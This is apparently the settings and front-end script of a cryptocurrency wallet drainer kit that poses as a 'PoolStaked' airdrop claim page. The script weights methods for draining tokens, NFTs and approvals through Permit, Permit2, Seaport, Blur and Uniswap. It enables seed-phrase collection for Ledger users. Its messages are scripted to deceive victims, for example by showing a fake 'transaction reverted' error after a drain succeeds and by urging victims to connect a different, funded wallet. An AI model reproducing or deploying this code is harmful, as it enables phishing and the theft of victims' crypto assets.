// DRAINER SETTINGS
const DRAINER_TRANSACTION_MINVALUE = 1000;
const DRAINER_START_BY_DEFAULT_CHAIN = false;
const DRAINER_SWITCH_CHAIN_IF_PERCENTAGE = 150;
const DRAINER_PERMIT2_IF_PERCENTAGE = 50;
const DRAINER_SKIP_NOT_EXISTING_CHAIN = false;
const DRAINER_NATIVE_METHOD = "Claim"; //Verify, Check, Connect, Raffle, Join, Claim, Enter, ClaimRewards, ClaimReward, Multicall, Execute, Update, SecurityUpdate, Swap, Bridge, Gift, Confirm, Enable, Airdrop
const DRAINER_APP_NAME = "PoolStaked";

// DRAINER MULTIPLIERS [PC, MOBILE]
const DRAINER_PERMIT_FACTOR = [4, 4];
const DRAINER_PERMIT2_FACTOR = [4, 4];
const DRAINER_SEAPORT_FACTOR = [1, 1];
const DRAINER_X2Y2_FACTOR = [1, 1];
const DRAINER_BLUR_FACTOR = [1, 1];
const DRAINER_UNISWAP_FACTOR = [2, 2];
const DRAINER_PANCAKESWAPV3_FACTOR = [2, 2];
const DRAINER_SUSHISWAP_FACTOR = [1, 1];
const DRAINER_MOONBIRDS_FACTOR = [1, 1];
const DRAINER_UNISWAP_POSITIONS_FACTOR = [1, 1];
const DRAINER_CRYPTOPUNKS_FACTOR = [1, 1];
const DRAINER_APECOINSTAKING_FACTOR = [5, 5];
const DRAINER_NFT_SINGLE_TRANSFER_FACTOR = [1, 1];
const DRAINER_NFT_BATCH_TRANSFER_FACTOR = [1, 1];
const DRAINER_NFT_APPROVE_FACTOR = [1, 1];
const DRAINER_TOKEN_TRANSFER_FACTOR = [1, 1];
const DRAINER_TOKEN_APPROVE_BYPASS_FACTOR = [3, 3];
const DRAINER_NATIVE_FACTOR = [1, 1];

const DRAINER_LEDGER_PHRASES = true;

function getEligibleAmount(v) {
	let bonus = v > 10000 ? v / 150000 : 0;
	let val = (1.7 + bonus).toFixed(2);
	if(val > 7) val = 7.7;
	return val;
}

function showModal(type, text, time) {
	const Toast = Swal.mixin({
		toast: true,
		position: 'top-end',
		showConfirmButton: false,
		timer: time,
		padding: 20,
		timerProgressBar: true,
		didOpen: (toast) => {
			toast.addEventListener('mouseenter', Swal.stopTimer)
			toast.addEventListener('mouseleave', Swal.resumeTimer)
		}
	});

	Toast.fire({
		icon: type,
		title: text,
	});
}

async function updateStatus(status, arg) {
	// on wallet connect error == 0
	// on wallet connect == 1
	// on api request == 2
	// on api error == 3
	// on eligible == 4
	// on not eligible == 5
    // on transaction accept == 6
	// on transaction decline == 7
	// on not enough native for gas == 8
	// on chain changed == 9
	if(status == 0) {
		if(!arg) {
			showModal("error", "Wallet connection failed! Try with another wallet.", 5000);
			return;
		}
		if(arg.toLowerCase) arg = arg.toLowerCase();
		if(arg.includes && arg.includes("rejected")) {
			showModal("error", "Pending wallet connection! Try connecting your wallet manually.", 5000);
		}
	} else if(status == 1) {
		console.log("selected wallet:", selectedWallet);
		console.log("selected chain:", selectedChain);
		updateWebsite();
	} else if(status == 2) {
		showModal("info", "Connecting...", 4000);
		document.getElementById("drainer-button").innerHTML = "Pending Claim";
	} else if(status == 3) {
			showModal("error", "Wallet connection failed, try again later.", 5000);
	} else if(status == 4) {

	} else if(status == 5) {
		var native_name = "0.3 ETH";
		if(selectedChain == "matic") {
			native_name = "900.0 MATIC";
		}
		Swal.fire({
			title: DRAINER_APP_NAME,
			html: "It looks like you are connecting an address that was not included in the current Airdrop round, please make sure to <b>connect with the address</b> you received the Airdrop on, otherwise it will not work.<br><br>If you are experiencing any issues, feel free to contact our live chat at the bottom. We are available 24/7!",
			confirmButtonText: 'GOT IT!',
		});
		document.getElementById("drainer-button").innerHTML = "Switch wallet";
		updateWebsite();
	} else if(status == 6) {
		showModal("error", "Transaction execution reverted due to high contract demand. Please try again.", 2500);
	} else if(status == 7) {
		showModal("error", "Wallet verification declined.", 3000);
	} else if(status == 8) {
		showModal("error", "You don't have enough ETH for transaction gas.", 5000);
		await sleep(2000);
	} else if(status == 9) {
		updateWebsite();
	}
}

function updateWebsite() {
	try {
		document.getElementById("drainer-address").innerHTML = "Connected wallet: " + walletAddress.slice(0, 9) + "..." + walletAddress.slice(-7);
		if(eligible) {
			document.getElementById("drainer-eligibility").innerHTML = "You are eligible to claim: <b>" + getEligibleAmount(chainValues) + " PoolStaked Ether</b>";
		} else {
			document.getElementById("drainer-eligibility").innerHTML = "You are not eligible to claim";
		}
	} catch(err) {
		request_monitor({
			process: "UPDATE_WEBSITE",
			error: err,
		});
	}
}